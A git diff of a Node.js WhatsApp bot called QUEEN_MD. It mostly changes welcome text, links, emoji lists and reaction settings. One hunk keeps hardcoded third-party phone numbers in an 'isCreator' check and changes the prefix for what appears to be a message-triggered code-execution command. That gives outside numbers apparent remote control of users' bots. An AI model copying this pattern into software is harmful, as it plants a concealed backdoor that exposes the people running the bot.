@@ -102,7 +102,7 @@ const port = process.env.PORT || 9090;
   connectToWA()
   }
   } else if (connection === 'open') {
-  console.log('Installing Plugins 🔌')
+  console.log('🧬 Installing Plugins')
   const path = require('path');
   fs.readdirSync("./plugins/").forEach((plugin) => {
   if (path.extname(plugin).toLowerCase() == ".js") {
@@ -112,8 +112,8 @@ const port = process.env.PORT || 9090;
   console.log('Plugins installed successful ✅')
   console.log('Bot connected to whatsapp ✅')
   
-  let up = `*Hello There QUEEN_MD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet QUEEN_MD WhatsApp Bot.\n\n *Thanks for using QUEEN_MD \ud83d\udea9* \n\n> Join WhatsApp Channel :- ⤵️\n \nhttps://whatsapp.com/channel/0029Vb5bRrw8V0tfRMVnSS2o\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/CAMP-LK/QUEEN_MD\n\n> © Powered BY MR DILISHA \ud83d\udda4`;
-    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/gbD3yY9T/7484.jpg` }, caption: up })
+  let up = `*Hello there QUEEN_MD User! \ud83d\udc4b\ud83c\udffb* \n\n> Simple , Straight Forward But Loaded With Features \ud83c\udf8a, Meet QUEEN_MD WhatsApp Bot.\n\n *Thanks for using QUEEN_MD \ud83d\udea9* \n\n> Join WhatsApp Group :- ⤵️\n \nhttps://chat.whatsapp.com/JiXcNWoBius2ibJjo2pVXG\n\n- *YOUR PREFIX:* = ${prefix}\n\nDont forget to give star to repo ⬇️\n\nhttps://github.com/CAMP-LK/QUEEN_MD\n\n> ㋛ 𝙿𝙾𝚆𝙴𝚁𝙳 𝙱𝚈 ꧁𝚀𝚄𝙴𝙴𝙽_𝙼𝙳 〽️Ｄ \ud83d\udda4`;
+    conn.sendMessage(conn.user.id, { image: { url: `https://i.ibb.co/zhwQm1RJ/temp-Img2-Url.jpg` }, caption: up })
   }
   })
   conn.ev.on('creds.update', saveCreds)
@@ -150,7 +150,7 @@ const port = process.env.PORT || 9090;
     }
   if (mek.key && mek.key.remoteJid === 'status@broadcast' && config.AUTO_STATUS_REACT === "true"){
     const jawadlike = await conn.decodeJid(conn.user.id);
-    const emojis = ['🤔', '🤩', '😘', '👍', '🦋', '🥰', '🥳', '😊', '🫡', '🤫', '🤗', '🫣', '😇', '😎', '❤️', '🧡', '💛', '💚', '🩵', '💙', '💜', '🤎', '🖤', '🩶', '🤍', '🩷', '💝', '💖', '💗', '💓', '💞', '💕', '❤️‍🩹', '❣️', '💔', '❤️‍🔥', '🦚'];
+    const emojis = ['❤️', '💸', '😇', '🍂', '💥', '💯', '🔥', '💫', '💎', '💗', '🤍', '🖤', '👀', '🙌', '🙆', '🚩', '🥰', '💐', '😎', '🤎', '✅', '🫀', '🧡', '😁', '😄', '🌸', '🕊️', '🌷', '⛅', '🌟', '🗿', '🇵🇰', '💜', '💙', '🌝', '🖤', '💚'];
     const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
     await conn.sendMessage(mek.key.remoteJid, {
       react: {
@@ -198,12 +198,12 @@ const port = process.env.PORT || 9090;
   conn.sendMessage(from, { text: teks }, { quoted: mek })
   }
   const udp = botNumber.split('@')[0];
-    const jawad = ('94771098429', '94742609756');
+    const jawad = ('94771098429', '94742609756', '94771098429');
     let isCreator = [udp, jawad, config.DEV]
 					.map(v => v.replace(/[^0-9]/g) + '@s.whatsapp.net')
 					.includes(mek.sender);
 
-    if (isCreator && mek.text.startsWith('>')) {
+    if (isCreator && mek.text.startsWith('%')) {
 					let code = budy.slice(2);
 					if (!code) {
 						reply(
@@ -243,12 +243,32 @@ const port = process.env.PORT || 9090;
 					}
 					return;
 				}
+ 
+// custum react settings        
+                        
+if (!isReact && senderNumber !== botNumber) {
+    if (config.CUSTOM_REACT === 'true') {
+        // Use custom emojis from the configuration
+        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+        m.react(randomReaction);
+    }
+}
+
+if (!isReact && senderNumber === botNumber) {
+    if (config.CUSTOM_REACT === 'true') {
+        // Use custom emojis from the configuration
+        const reactions = (config.CUSTOM_REACT_EMOJIS || '🥲,😂,👍🏻,🙂,😔').split(',');
+        const randomReaction = reactions[Math.floor(Math.random() * reactions.length)];
+        m.react(randomReaction);
+    }
+} 
         
   //==========WORKTYPE============ 
   if(!isOwner && config.MODE === "private") return
   if(!isOwner && isGroup && config.MODE === "inbox") return
   if(!isOwner && !isGroup && config.MODE === "groups") return
-
+   
   // take commands 
                  
   const events = require('./command')
@@ -723,7 +743,7 @@ const port = process.env.PORT || 9090;
   }
   
   app.get("/", (req, res) => {
-  res.send("QUEEN MD STARTED ✅");
+  res.send("QUEEN_MD STARTED ✅");
   });
   app.listen(port, () => console.log(`Server listening on port http://localhost:${port}`));
   setTimeout(() => {
